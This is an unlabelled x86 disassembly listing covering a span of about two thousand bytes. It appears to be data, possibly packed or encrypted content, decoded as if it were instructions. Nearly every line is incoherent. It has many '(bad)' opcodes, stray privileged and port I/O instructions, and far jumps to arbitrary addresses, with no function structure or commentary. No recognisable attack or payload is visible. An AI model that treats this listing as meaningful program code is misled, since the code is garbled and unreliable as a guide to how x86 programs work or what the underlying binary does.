  41be4c:	mov    ebx,0x99b32d71
  41be51:	not    BYTE PTR [edi-0x2f]
  41be54:	inc    ecx
  41be55:	fwait
  41be56:	out    0xc0,al
  41be58:	scas   eax,DWORD PTR es:[edi]
  41be59:	pop    es
  41be5a:	pop    ebx
  41be5b:	xchg   DWORD PTR [ebp+0x54],edi
  41be5e:	pushf  
  41be5f:	iret   
  41be60:	mov    ebx,ebx
  41be62:	popf   
  41be63:	out    dx,eax
  41be64:	aas    
  41be65:	pop    ebp
  41be66:	dec    edi
  41be67:	and    eax,0x2e89e4f1
  41be6c:	xchg   DWORD PTR [ebp-0x49],esp
  41be6f:	add    DWORD PTR [ebx+0x4a],0x6398c5f9
  41be76:	jge    0x41be9f
  41be78:	iret   
  41be79:	rol    BYTE PTR [esp+edx*1+0x7e300614],1
  41be80:	inc    ecx
  41be81:	mov    ebx,0xd1516d2c
  41be86:	test   eax,0x3720c089
  41be8b:	cmp    ch,cl
  41be8d:	ds je  0x41be67
  41be90:	and    DWORD PTR [esi],esp
  41be92:	outs   dx,BYTE PTR ds:[esi]
  41be93:	stos   DWORD PTR es:[edi],eax
  41be94:	or     al,0xd8
  41be96:	(bad)  
  41be97:	ds fsubr st,st(6)
  41be9a:	xchg   ecx,eax
  41be9b:	fstp   DWORD PTR [ecx+0x199cc82e]
  41bea1:	jl     0x41be9f
  41bea3:	(bad)  
  41bea4:	dec    ebp
  41bea5:	and    eax,0x37f922ff
  41beaa:	mov    esi,0xb0571a71
  41beaf:	ins    DWORD PTR es:[edi],dx
  41beb0:	dec    esi
  41beb1:	test   eax,0xc44a1d01
  41beb6:	mov    edx,0xe0ac0286
  41bebb:	lea    edx,[ebp+0x4324592c]
  41bec1:	mov    esp,0x792327e8
  41bec6:	cwde   
  41bec7:	xchg   BYTE PTR [ecx+0x5e],al
  41beca:	sub    BYTE PTR [ebx+ecx*2],al
  41becd:	clc    
  41bece:	inc    edi
  41becf:	sub    dl,cl
  41bed1:	push   0x36
  41bed3:	dec    eax
  41bed4:	nop
  41bed5:	inc    esp
  41bed6:	inc    edx
  41bed7:	retf   0x23fb
  41beda:	mov    eax,0x24d77460
  41bedf:	imul   ebx,DWORD PTR ds:0x1b962f40,0x72
  41bee6:	fwait
  41bee7:	xor    eax,0x6e812ce4
  41beec:	xchg   ebx,eax
  41beed:	cmp    ah,dl
  41beef:	out    0xb,eax
  41bef1:	add    al,0x49
  41bef3:	xchg   ebp,eax
  41bef4:	mov    eax,ds:0x81fbc4ec
  41bef9:	ret    
  41befa:	das    
  41befb:	push   esi
  41befc:	popa   
  41befd:	jmp    0x9ef59978
  41bf02:	xor    eax,0x2748d970
  41bf07:	and    DWORD PTR [ebx],0xffffff8f
  41bf0a:	sub    DWORD PTR [edx+0x59],0x4a
  41bf0e:	push   cs
  41bf0f:	jmp    0x41bf1f
  41bf11:	adc    DWORD PTR [ecx-0x68],ebx
  41bf14:	sti    
  41bf15:	xor    DWORD PTR [esi-0x68ca2564],eax
  41bf1b:	jmp    0x39370ab3
  41bf20:	or     DWORD PTR [edx-0x5c],0x611985e1
  41bf27:	adc    al,0xa1
  41bf29:	jo     0x41bef0
  41bf2b:	scas   al,BYTE PTR es:[edi]
  41bf2c:	xor    eax,0xeae772c0
  41bf31:	pusha  
  41bf32:	test   BYTE PTR [edi+0x32],dl
  41bf35:	idiv   BYTE PTR ds:0xe7b9dc65
  41bf3b:	pop    ecx
  41bf3c:	cld    
  41bf3d:	ss stc 
  41bf3f:	add    cl,BYTE PTR [edx+0x5]
  41bf42:	push   ecx
  41bf43:	test   ebx,0x5d35bed4
  41bf49:	push   ds
  41bf4a:	mov    cl,0xd0
  41bf4c:	call   0xd9d7:0x9e579321
  41bf53:	mov    eax,ds:0x2ab70321
  41bf58:	ret    0x543a
  41bf5b:	(bad)  
  41bf5c:	sar    DWORD PTR [ebx],1
  41bf5e:	cmp    esi,edi
  41bf60:	cmc    
  41bf61:	enter  0x571e,0x9c
  41bf65:	stc    
  41bf66:	xchg   ecx,eax
  41bf67:	ret    0x427b
  41bf6a:	adc    al,0x68
  41bf6c:	push   esi
  41bf6d:	sub    ebp,DWORD PTR [ecx+0x1c]
  41bf70:	dec    esp
  41bf71:	in     eax,dx
  41bf72:	int    0x2c
  41bf74:	xor    dl,ch
  41bf76:	add    ebp,DWORD PTR [esi-0x53ade95e]
  41bf7c:	loopne 0x41bf8f
  41bf7e:	xchg   ebp,eax
  41bf7f:	das    
  41bf80:	and    eax,0x1fe34aad
  41bf85:	out    dx,eax
  41bf86:	or     DWORD PTR [ebx],ebx
  41bf88:	push   ss
  41bf89:	xchg   edi,eax
  41bf8a:	cld    
  41bf8b:	addr16 cmp eax,0xb7e2cb3e
  41bf91:	mov    edi,0x3e01b6bb
  41bf96:	in     al,dx
  41bf97:	adc    al,0xaa
  41bf99:	arpl   WORD PTR [edx+0x56d32e64],cx
  41bf9f:	cmp    eax,0xb2d996e0
  41bfa4:	add    eax,0xcc53bd2d
  41bfa9:	out    0x1d,eax
  41bfab:	repz jp 0x41bf4e
  41bfae:	cli    
  41bfaf:	(bad)  
  41bfb0:	aad    0xea
  41bfb2:	and    DWORD PTR [edi-0x24c8faf9],esp
  41bfb8:	and    ch,bh
  41bfba:	out    0x44,al
  41bfbc:	xor    eax,0x7be2807e
  41bfc1:	lods   eax,DWORD PTR ds:[esi]
  41bfc2:	mov    esi,0x4ef54485
  41bfc7:	xchg   DWORD PTR [edx],ebx
  41bfc9:	cmp    dh,BYTE PTR [edi+0x5]
  41bfcc:	outs   dx,BYTE PTR ds:[esi]
  41bfcd:	mov    bl,0xfe
  41bfcf:	or     BYTE PTR [ebp+0x4c],dl
  41bfd2:	sub    ebx,DWORD PTR [edi+edx*2]
  41bfd5:	or     BYTE PTR [esi-0x2b16c6c5],dh
  41bfdb:	sub    BYTE PTR [edx],cl
  41bfdd:	push   eax
  41bfde:	pop    edx
  41bfdf:	mov    bh,0xb0
  41bfe1:	xchg   ebx,eax
  41bfe2:	xchg   esi,eax
  41bfe3:	ficom  DWORD PTR [ebx-0x7]
  41bfe6:	dec    esi
  41bfe7:	in     al,0xff
  41bfe9:	and    eax,0x1e2c0ead
  41bfee:	std    
  41bfef:	mov    bh,0x35
  41bff1:	mov    esi,0x1c893144
  41bff6:	scas   al,BYTE PTR es:[edi]
  41bff7:	ds sbb al,al
  41bffa:	jl     0x41c04e
  41bffc:	mov    esp,0x56cff2fc
  41c001:	push   0xffffffa3
  41c003:	pushf  
  41c004:	cmp    al,0xeb
  41c006:	rcr    BYTE PTR [ebx],cl
  41c008:	fdiv   DWORD PTR [eax]
  41c00a:	xchg   esi,eax
  41c00b:	icebp  
  41c00c:	shl    DWORD PTR [eax+0x98e2de8],cl
  41c012:	adc    dl,BYTE PTR es:0xbc479b22
  41c019:	(bad)  
  41c01a:	mov    cl,0x44
  41c01c:	fs clc 
  41c01e:	nop
  41c01f:	pusha  
  41c020:	xchg   ecx,eax
  41c021:	push   0xffffffa5
  41c023:	rcl    DWORD PTR [ecx],0xf8
  41c026:	and    cl,BYTE PTR [eax]
  41c028:	mov    eax,0x28e865a
  41c02d:	cwde   
  41c02e:	outs   dx,DWORD PTR ds:[esi]
  41c02f:	mov    bh,bh
  41c031:	lods   al,BYTE PTR ds:[esi]
  41c032:	loopne 0x41bfcd
  41c034:	push   ebp
  41c035:	int3   
  41c036:	xor    ebp,DWORD PTR [esi-0x43]
  41c039:	push   0x304b58e9
  41c03e:	mov    DWORD PTR [eax+edi*4-0x3506872b],ebp
  41c045:	nop
  41c046:	rol    BYTE PTR [edi],cl
  41c048:	cmp    DWORD PTR ds:0x91087401,0x8632b8f0
  41c052:	pusha  
  41c053:	hlt    
  41c054:	call   0x7e02:0xeb90aa1
  41c05b:	aam    0xe7
  41c05d:	test   eax,0x6a4d841a
  41c062:	test   DWORD PTR [esi-0x46],ebp
  41c065:	je     0x41c008
  41c067:	dec    ebx
  41c068:	mov    eax,0xdfaa4eab
  41c06d:	xlat   BYTE PTR ds:[ebx]
  41c06e:	lea    eax,[edx]
  41c070:	cmp    eax,0x47763336
  41c075:	or     esi,DWORD PTR [eax+ecx*2-0x4e]
  41c079:	and    al,0x44
  41c07b:	adc    ecx,DWORD PTR [ecx+0x66]
  41c07e:	iret   
  41c07f:	das    
  41c080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c081:	test   DWORD PTR [ebp-0x364c89a9],esi
  41c087:	call   DWORD PTR [edx]
  41c089:	retf   
  41c08a:	pop    es
  41c08b:	enter  0x26d2,0xc
  41c08f:	ja     0x41c110
  41c091:	and    BYTE PTR [edx+0x9efc7e8],ah
  41c097:	shl    esp,0x2b
  41c09a:	push   ds
  41c09b:	inc    ebx
  41c09c:	cs xchg ecx,eax
  41c09e:	sbb    ch,0x64
  41c0a1:	pop    ecx
  41c0a2:	div    DWORD PTR [ecx+0x3f]
  41c0a5:	fs dec ebp
  41c0a7:	mov    ds,WORD PTR ds:0x8064742e
  41c0ad:	sub    DWORD PTR [ecx],esp
  41c0af:	sbb    ch,ah
  41c0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0b2:	mov    DWORD PTR [ecx*8-0x3deef42],0x3776c8b8
  41c0bd:	xlat   BYTE PTR ds:[ebx]
  41c0be:	in     eax,0x36
  41c0c0:	ror    DWORD PTR [ecx-0x1ede490a],1
  41c0c6:	enter  0xc6db,0xa2
  41c0ca:	fisttp WORD PTR [esi+0x6003173]
  41c0d0:	mov    bh,0x12
  41c0d2:	inc    ebx
  41c0d3:	fidivr WORD PTR [edx]
  41c0d5:	je     0x41c10a
  41c0d7:	and    bl,BYTE PTR [ecx+0x1b8b633c]
  41c0dd:	jno    0x41c0b3
  41c0df:	pop    ecx
  41c0e0:	dec    edi
  41c0e1:	test   DWORD PTR [ebx+0x38563455],edx
  41c0e7:	aam    0x4d
  41c0e9:	sbb    eax,0xc5bb3d09
  41c0ee:	push   ebp
  41c0ef:	loopne 0x41c131
  41c0f1:	jb     0x41c12c
  41c0f3:	mov    cl,0xaf
  41c0f5:	mov    ebp,eax
  41c0f7:	fst    DWORD PTR [ebx-0x56]
  41c0fa:	inc    ecx
  41c0fb:	mov    ch,BYTE PTR [ebp-0x3cde8421]
  41c101:	(bad)  
  41c102:	(bad)  
  41c103:	hlt    
  41c104:	je     0x41c176
  41c106:	sub    edx,DWORD PTR [ebx-0x55]
  41c109:	xchg   ecx,eax
  41c10a:	jmp    0xc2c8:0xfb26a400
  41c111:	clc    
  41c112:	fst    st(4)
  41c114:	jle    0x41c0d5
  41c116:	out    dx,al
  41c117:	repz jmp 0x79bd4bac
  41c11d:	and    esp,DWORD PTR [ecx]
  41c11f:	(bad)  
  41c120:	xor    DWORD PTR [edi],edi
  41c122:	jp     0x41c17c
  41c124:	mov    eax,0xdb3889e3
  41c129:	inc    edi
  41c12a:	inc    edx
  41c12b:	mov    dl,al
  41c12d:	stos   DWORD PTR es:[edi],eax
  41c12e:	int    0xa
  41c130:	jle    0x41c17f
  41c132:	push   ss
  41c133:	xchg   edx,eax
  41c134:	pop    eax
  41c135:	dec    eax
  41c136:	inc    esp
  41c137:	cmp    al,0xcf
  41c139:	mov    ds:0x29f4af2e,al
  41c13e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c13f:	adc    al,0x9
  41c141:	lods   al,BYTE PTR ds:[esi]
  41c142:	jl     0x41c141
  41c144:	mov    ds:0xc64071ba,eax
  41c149:	cmp    BYTE PTR [edx],al
  41c14b:	sbb    eax,0xa8d6d7d0
  41c150:	pop    edi
  41c151:	div    ch
  41c153:	das    
  41c154:	cdq    
  41c155:	ja     0x41c14c
  41c157:	xchg   esi,eax
  41c158:	xchg   edx,eax
  41c159:	jecxz  0x41c10d
  41c15b:	ins    BYTE PTR es:[edi],dx
  41c15c:	int3   
  41c15d:	or     ah,BYTE PTR [edx+0x71]
  41c160:	test   al,0xc4
  41c162:	test   DWORD PTR [ecx+0x45819187],esi
  41c168:	sti    
  41c169:	sub    BYTE PTR [esi-0x3d],cl
  41c16c:	xor    al,0x32
  41c16e:	ins    BYTE PTR es:[edi],dx
  41c16f:	push   esp
  41c170:	pushf  
  41c171:	pop    ss
  41c172:	fwait
  41c173:	outs   dx,DWORD PTR ds:[esi]
  41c174:	gs jnp 0x41c136
  41c177:	inc    esp
  41c178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c179:	rcl    DWORD PTR [ebp-0x26fcf007],1
  41c17f:	and    eax,0x83861749
  41c184:	retf   0xd44c
  41c187:	fdiv   QWORD PTR [edx-0x1c]
  41c18a:	or     ch,BYTE PTR [esi+0x23]
  41c18d:	mov    dl,0xff
  41c18f:	cli    
  41c190:	int3   
  41c191:	pop    edi
  41c192:	xor    eax,0xd301d1cd
  41c197:	loopne 0x41c1d3
  41c199:	popf   
  41c19a:	imul   DWORD PTR [edx+0x6bd833c]
  41c1a0:	mov    dh,0xbe
  41c1a2:	call   0x185b:0xbf2bd96a
  41c1a9:	fs xchg edx,eax
  41c1ab:	mov    bh,0xe7
  41c1ad:	sar    bh,1
  41c1af:	int3   
  41c1b0:	mov    ds,WORD PTR [ecx+0x7]
  41c1b3:	outs   dx,DWORD PTR ds:[esi]
  41c1b4:	xchg   DWORD PTR [edi-0x35],ebx
  41c1b7:	fs mov es,edi
  41c1ba:	shl    BYTE PTR [ecx],0x79
  41c1bd:	mov    bl,0x7f
  41c1bf:	mov    dl,0xe8
  41c1c1:	bound  edi,QWORD PTR [edx+0x53]
  41c1c4:	fadd   QWORD PTR [ebx]
  41c1c6:	test   eax,ecx
  41c1c8:	sbb    DWORD PTR [eax-0x1a],0x55d57191
  41c1cf:	cwde   
  41c1d0:	ins    DWORD PTR es:[edi],dx
  41c1d1:	sahf   
  41c1d2:	aaa    
  41c1d3:	mov    ebx,fs
  41c1d5:	fadd   DWORD PTR [ecx]
  41c1d7:	jmp    0xbd11:0x8769fae0
  41c1de:	mov    esi,0x3eafb338
  41c1e3:	cmp    BYTE PTR [ebx+esi*8-0xc7bceee],0x24
  41c1eb:	xchg   BYTE PTR [edi-0x38],cl
  41c1ee:	add    ah,BYTE PTR [esi-0x1efee745]
  41c1f4:	mov    ebp,0xf7575214
  41c1f9:	adc    DWORD PTR [ebx-0x75],esp
  41c1fc:	outs   dx,DWORD PTR ds:[esi]
  41c1fd:	mov    al,0x8c
  41c1ff:	vrcpss xmm0,xmm4,DWORD PTR [eax]
  41c203:	or     al,0x65
  41c205:	popf   
  41c206:	jmp    0x41797639
  41c20b:	out    0xe4,al
  41c20d:	push   ebx
  41c20e:	adc    eax,0x89d4f6a8
  41c213:	(bad)  
  41c216:	push   ebx
  41c217:	(bad)  
  41c218:	pop    ebx
  41c219:	les    esi,FWORD PTR [edi+0x33]
  41c21c:	fbld   TBYTE PTR [edx+0x7d]
  41c21f:	lahf   
  41c220:	push   es
  41c221:	ret    0x4682
  41c224:	jmp    0xc551:0x873d98a8
  41c22b:	dec    edi
  41c22c:	dec    ebx
  41c22d:	lds    esi,FWORD PTR [eax]
  41c22f:	cmc    
  41c230:	push   ebp
  41c231:	add    eax,0xc6cff831
  41c236:	imul   esp
  41c238:	stc    
  41c239:	xchg   BYTE PTR [eax-0x4669ecd7],cl
  41c23f:	push   edx
  41c240:	sub    ebp,DWORD PTR [ecx-0x591d2a5f]
  41c246:	shl    BYTE PTR [ecx+0x4f],1
  41c249:	out    dx,al
  41c24a:	cmp    DWORD PTR [ecx+0x27],edi
  41c24d:	cs dec ebx
  41c24f:	out    dx,al
  41c250:	(bad)  
  41c251:	mov    edi,0xef05906a
  41c256:	fidivr DWORD PTR [esi+0x2bb2d2c1]
  41c25c:	lods   al,BYTE PTR ds:[esi]
  41c25d:	test   ebx,esi
  41c25f:	cdq    
  41c260:	xlat   BYTE PTR ds:[ebx]
  41c261:	cwde   
  41c262:	imul   ecx,DWORD PTR [ebx+eax*1],0xffffff88
  41c266:	enter  0x31de,0x48
  41c26a:	test   eax,0x5aa6dca0
  41c26f:	call   0x88c89681
  41c274:	adc    eax,0x28ea4a4c
  41c279:	xchg   edi,eax
  41c27a:	jp     0x41c24d
  41c27c:	xchg   esp,eax
  41c27d:	push   edx
  41c27e:	jg     0x41c2de
  41c280:	dec    esi
  41c281:	iret   
  41c282:	in     eax,dx
  41c283:	stc    
  41c284:	mov    bh,0x30
  41c286:	jmp    DWORD PTR [si+0x12]
  41c28a:	sbb    al,0x7a
  41c28c:	fs dec edx
  41c28e:	push   0xc2e5d9b3
  41c293:	and    BYTE PTR [edx+edx*8],0xe4
  41c297:	aad    0xd7
  41c299:	mov    bl,0x69
  41c29b:	adc    bh,BYTE PTR [edx+0x5c]
  41c29e:	mov    dl,0x79
  41c2a0:	jnp    0x41c263
  41c2a2:	mov    esi,0xe821bbd6
  41c2a7:	fadd   st(7),st
  41c2a9:	sbb    ch,dl
  41c2ab:	out    0x0,eax
  41c2ad:	mov    eax,ds:0x8f161586
  41c2b2:	enter  0xf9ba,0xd3
  41c2b6:	ret    
  41c2b7:	sahf   
  41c2b8:	pop    ebx
  41c2b9:	mov    ecx,0xe2813b26
  41c2be:	jae    0x41c2b3
  41c2c0:	mov    dl,0xc5
  41c2c2:	or     edi,esi
  41c2c4:	(bad)  
  41c2c5:	mov    ds:0x1e2d21e7,eax
  41c2ca:	jae    0x41c31a
  41c2cc:	xor    cl,BYTE PTR [ecx-0x6c6577e6]
  41c2d2:	cmp    eax,0x5b0d5f9e
  41c2d7:	cdq    
  41c2d8:	mov    dl,0xdf
  41c2da:	hlt    
  41c2db:	es ins BYTE PTR es:[edi],dx
  41c2dd:	cmp    dh,BYTE PTR [ebp-0x39]
  41c2e0:	mov    al,0x24
  41c2e2:	pop    ds
  41c2e3:	sub    edx,ecx
  41c2e5:	xchg   DWORD PTR [ebp+0x3],esi
  41c2e8:	push   ebx
  41c2e9:	call   0x71ad:0x91b97ec8
  41c2f0:	push   cs
  41c2f1:	jecxz  0x41c2cc
  41c2f3:	cdq    
  41c2f4:	cmp    eax,0xb596fd32
  41c2f9:	push   eax
  41c2fa:	enter  0x36b6,0x17
  41c2fe:	loope  0x41c32d
  41c300:	fdiv   DWORD PTR ds:0xb645c886
  41c306:	or     DWORD PTR [ebp+0x4bb0071b],ecx
  41c30c:	aam    0x5b
  41c30e:	mov    dl,0x74
  41c310:	(bad)  
  41c311:	leave  
  41c312:	cdq    
  41c313:	mov    al,0xdb
  41c315:	dec    edi
  41c316:	pop    ds
  41c317:	sub    edi,edi
  41c319:	bound  ebx,QWORD PTR [esp+ecx*2]
  41c31c:	imul   ebx,DWORD PTR [ebx-0x1e],0x39
  41c320:	mov    dl,0x72
  41c322:	aad    0xf4
  41c324:	ins    DWORD PTR es:[edi],dx
  41c325:	in     eax,dx
  41c326:	push   ds
  41c327:	pop    eax
  41c328:	xchg   ebx,eax
  41c329:	je     0x41c2e1
  41c32b:	jl     0x41c2d9
  41c32d:	stos   BYTE PTR es:[edi],al
  41c32e:	mov    ebp,0x9c676adb
  41c333:	adc    edx,esi
  41c335:	push   esp
  41c336:	mov    ss,WORD PTR [edi+0x5f]
  41c339:	js     0x41c373
  41c33b:	enter  0x5308,0x66
  41c33f:	in     al,dx
  41c340:	and    ah,BYTE PTR [ebx-0x30]
  41c343:	rol    BYTE PTR [ebp-0x6d],1
  41c346:	mov    esp,0xa737949e
  41c34b:	call   0xed23:0xe60f4af7
  41c352:	pop    ds
  41c353:	shl    BYTE PTR [ebx+0x2cdbd14],1
  41c359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35a:	jns    0x41c3ce
  41c35c:	iret   
  41c35d:	mov    BYTE PTR [edi-0x7bb37d63],ch
  41c363:	mov    bl,0x4d
  41c365:	out    0x61,eax
  41c367:	dec    esp
  41c368:	add    eax,0x6a93938
  41c36d:	xchg   edx,eax
  41c36e:	jle    0x41c3bb
  41c370:	inc    ebx
  41c371:	sar    ebx,0x85
  41c374:	cwde   
  41c375:	aam    0xe5
  41c377:	push   esi
  41c378:	xchg   esp,eax
  41c379:	and    DWORD PTR [ecx],ebx
  41c37b:	mov    ebp,0x17a8eb90
  41c380:	jp     0x41c39b
  41c382:	pop    ebp
  41c383:	or     dh,ah
  41c385:	rcr    BYTE PTR [edx+0x38e1672],cl
  41c38b:	loop   0x41c313
  41c38d:	out    0xb1,eax
  41c38f:	sub    DWORD PTR [ebp-0x43],edi
  41c392:	(bad)  
  41c393:	(bad)  
  41c394:	cld    
  41c395:	mov    ds:0x123d4d53,al
  41c39a:	mov    al,0x34
  41c39c:	sahf   
  41c39d:	fadd   st(1),st
  41c39f:	in     eax,dx
  41c3a0:	icebp  
  41c3a1:	cwde   
  41c3a2:	jg     0x41c3e6
  41c3a4:	bound  ecx,QWORD PTR [ecx+esi*8]
  41c3a7:	repnz adc DWORD PTR [eax],ebx
  41c3aa:	rdpmc  
  41c3ac:	retf   
  41c3ad:	(bad)  
  41c3ae:	cli    
  41c3af:	pop    ebx
  41c3b0:	ffreep st(0)
  41c3b2:	pop    ebp
  41c3b3:	xchg   edx,eax
  41c3b4:	inc    ecx
  41c3b5:	jg     0x41c360
  41c3b7:	out    dx,eax
  41c3b8:	call   0xfce5:0xe600d708
  41c3bf:	push   esp
  41c3c0:	adc    al,0x63
  41c3c2:	cmc    
  41c3c3:	les    edx,FWORD PTR [eax+0x3b]
  41c3c6:	in     al,dx
  41c3c7:	bound  eax,QWORD PTR [edx+0x7b3a5c0]
  41c3cd:	cli    
  41c3ce:	imul   edi,DWORD PTR [ebp+edx*1-0x6617f2a4],0x56c45922
  41c3d9:	dec    esi
  41c3da:	adc    DWORD PTR [ebx-0x6fa1759b],edx
  41c3e0:	dec    eax
  41c3e1:	pushf  
  41c3e2:	pusha  
  41c3e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3e4:	xor    ah,BYTE PTR [edi-0x6b]
  41c3e7:	dec    eax
  41c3e8:	(bad)  
  41c3e9:	adc    eax,0x2e21d029
  41c3ee:	jmp    0x54edf819
  41c3f3:	jmp    0x2ed6:0xe9b614a4
  41c3fa:	push   ebx
  41c3fb:	xchg   edi,eax
  41c3fc:	xchg   edi,eax
  41c3fd:	push   edi
  41c3fe:	xchg   ebx,eax
  41c3ff:	cmp    eax,ecx
  41c401:	nop
  41c402:	mov    esi,0x3e2116f4
  41c407:	mov    esp,0x49330e7f
  41c40c:	inc    ebx
  41c40d:	jns    0x41c417
  41c40f:	mov    dh,BYTE PTR [ecx]
  41c411:	cld    
  41c412:	inc    edx
  41c413:	sbb    ch,BYTE PTR [edi]
  41c415:	jo     0x41c44d
  41c417:	jns    0x41c470
  41c419:	out    dx,al
  41c41a:	iret   
  41c41b:	xchg   BYTE PTR [esi],ch
  41c41d:	ret    0xc990
  41c420:	icebp  
  41c421:	and    DWORD PTR [eax],ebp
  41c423:	arpl   WORD PTR [ebx-0x59],di
  41c426:	aaa    
  41c427:	scas   eax,DWORD PTR es:[edi]
  41c428:	imul   edi,DWORD PTR [eax],0xffe5ae04
  41c42e:	pushf  
  41c42f:	xlat   BYTE PTR ds:[ebx]
  41c430:	stos   BYTE PTR es:[edi],al
  41c431:	test   BYTE PTR [ebp+0x48],al
  41c434:	jns    0x41c3c1
  41c436:	or     al,0xb3
  41c438:	sahf   
  41c439:	xor    BYTE PTR [ecx+0x2eb0970],0xde
  41c440:	or     DWORD PTR [eax+0x4473a873],ebp
  41c446:	or     ah,BYTE PTR ds:0x170163f1
  41c44c:	rcl    BYTE PTR [ebp+0x439fe9f],cl
  41c452:	add    al,0x20
  41c454:	dec    edi
  41c455:	inc    esp
  41c456:	jno    0x41c43e
  41c458:	adc    al,0x67
  41c45a:	cld    
  41c45b:	rol    BYTE PTR [ebx+0x23],1
  41c45e:	jns    0x41c42e
  41c460:	mov    dl,0x1e
  41c462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c463:	sbb    DWORD PTR [eax-0x29ed43f],ebp
  41c469:	push   0x38
  41c46b:	ret    0x8b70
  41c46e:	dec    eax
  41c46f:	outs   dx,BYTE PTR ds:[esi]
  41c470:	sbb    BYTE PTR ds:0x4b0b8e63,dh
  41c476:	mov    dl,0x81
  41c478:	fsubr  DWORD PTR [esi-0x24]
  41c47b:	stos   BYTE PTR es:[edi],al
  41c47c:	mov    eax,ds:0xfbb9e83d
  41c481:	outs   dx,BYTE PTR ds:[esi]
  41c482:	mov    esi,DWORD PTR [edx]
  41c484:	xor    BYTE PTR [esi],ah
  41c486:	outs   dx,BYTE PTR ds:[esi]
  41c487:	jle    0x41c46a
  41c489:	adc    edi,eax
  41c48b:	dec    ebp
  41c48c:	popa   
  41c48d:	and    eax,0xa541576b
  41c492:	jle    0x41c421
  41c494:	mov    ch,0x36
  41c496:	pop    DWORD PTR [edx-0x13]
  41c499:	cmp    eax,0x66c823ae
  41c49e:	ror    BYTE PTR [edi+0x1b0c08a0],0xf0
  41c4a5:	data16 (bad) 
  41c4a7:	xchg   edi,eax
  41c4a8:	popa   
  41c4a9:	jmp    0x9f78243
  41c4ae:	cli    
  41c4af:	sbb    ch,BYTE PTR [edi*2+0x2db22ea6]
  41c4b6:	jmp    0x41c520
  41c4b8:	xchg   ebp,eax
  41c4b9:	xadd   BYTE PTR [edx-0x6551c66e],ah
  41c4c0:	in     eax,0x87
  41c4c2:	cs loop 0x41c468
  41c4c5:	xchg   DWORD PTR [edx],eax
  41c4c7:	push   ds
  41c4c8:	aaa    
  41c4c9:	mov    ebp,0x28d89ce5
  41c4ce:	outs   dx,BYTE PTR ds:[esi]
  41c4cf:	es xchg cl,bl
  41c4d2:	xchg   ecx,eax
  41c4d3:	pop    ebp
  41c4d4:	fst    DWORD PTR [edx+eiz*1+0xe]
  41c4d8:	xor    edx,esp
  41c4da:	or     bh,dl
  41c4dc:	cs jp  0x41c54d
  41c4df:	dec    edx
  41c4e0:	push   ebp
  41c4e1:	mov    al,0x86
  41c4e3:	cmp    ebp,ebp
  41c4e5:	sbb    DWORD PTR [esi-0x1ebdeca2],edx
  41c4eb:	xor    DWORD PTR [edi],0xffffffe9
  41c4ee:	ins    BYTE PTR es:[edi],dx
  41c4ef:	iret   
  41c4f0:	xchg   esp,eax
  41c4f1:	pop    ds
  41c4f2:	mov    cl,0xd1
  41c4f4:	bound  esp,QWORD PTR [edx+0x18]
  41c4f7:	push   0xffffffad
  41c4f9:	mov    edi,0x8b4bc0fd
  41c4fe:	pop    ebp
  41c4ff:	cs adc dh,ch
  41c502:	test   dl,ch
  41c504:	retf   
  41c505:	push   ebp
  41c506:	jp     0x41c4b2
  41c508:	not    BYTE PTR [ebx+ecx*1+0x733d81db]
  41c50f:	pop    esi
  41c510:	inc    edi
  41c511:	arpl   WORD PTR [edx],bx
  41c513:	inc    edx
  41c514:	sbb    DWORD PTR [eax+edi*8+0x3d],0x2e4c5602
  41c51c:	add    ebx,DWORD PTR [ebx+0x5482]
  41c522:	add    BYTE PTR [eax],al
  41c524:	add    BYTE PTR [eax],al
  41c526:	(bad)  
  41c527:	stc    
  41c528:	out    0xe3,eax
  41c52a:	(bad)  
  41c52b:	inc    edi
  41c52d:	std    
  41c52e:	fidivr WORD PTR [ebx]
  41c530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c531:	dec    esp
  41c532:	sub    esp,ebx
  41c534:	das    
  41c535:	mov    dl,0x9f
  41c537:	mov    esi,0x7220001
  41c53c:	add    BYTE PTR [eax],al
  41c53e:	popf   
  41c53f:	stos   BYTE PTR es:[edi],al
  41c540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c541:	add    eax,0xcdf58571
  41c546:	push   eax
  41c547:	lods   al,BYTE PTR ds:[esi]
  41c548:	cld    
  41c549:	in     al,0x21
  41c54b:	cs push ecx
  41c54d:	and    ebx,edi
  41c54f:	mov    al,ds:0x66a841f6
  41c554:	xor    al,0x30
  41c556:	ja     0x41c502
  41c558:	cdq    
  41c559:	fdivr  QWORD PTR [eax+0x12]
  41c55c:	enter  0xfeb9,0x7e
  41c560:	test   DWORD PTR [edx-0xc],edi
  41c563:	xchg   edi,eax
  41c564:	inc    esi
  41c565:	dec    ebx
  41c566:	shr    BYTE PTR [edx+0x73b6ad2d],0xa7
  41c56d:	xchg   edx,eax
  41c56e:	ja     0x41c55f
  41c570:	repnz pop esp
  41c572:	mul    BYTE PTR [ecx-0x6e6008c8]
  41c578:	xor    ebx,DWORD PTR [esi]
  41c57a:	and    BYTE PTR [esi-0x41aa335b],bh
  41c580:	xor    eax,0x2cc8f40
  41c585:	dec    esp
  41c586:	and    al,0x83
  41c588:	xor    eax,0x2c4b464d
  41c58d:	adc    cl,BYTE PTR [ebp-0x71d9d2ba]
  41c593:	add    cl,ch
  41c595:	nop
  41c596:	fwait
  41c597:	in     eax,dx
  41c598:	or     BYTE PTR [esi+0x2],al
  41c59b:	(bad)  
  41c59c:	jno    0x41c5f2
  41c59e:	inc    edi
  41c59f:	sbb    ecx,edx
  41c5a1:	cli    
  41c5a2:	lahf   
  41c5a3:	mov    BYTE PTR [esi+0x5],dh
  41c5a6:	repnz adc BYTE PTR [ecx-0x3d],ah
  41c5aa:	dec    ebx
  41c5ab:	retf   
  41c5ac:	push   cx
  41c5ae:	jle    0x41c5a5
  41c5b0:	(bad)  
  41c5b2:	(bad)  
  41c5b3:	data16 ss mov al,dh
  41c5b7:	xchg   ebx,eax
  41c5b8:	fild   DWORD PTR [eax-0x31]
  41c5bb:	xor    ebp,esi
  41c5bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5be:	lock mov WORD PTR [ecx-0x57546869],fs
  41c5c5:	inc    edx
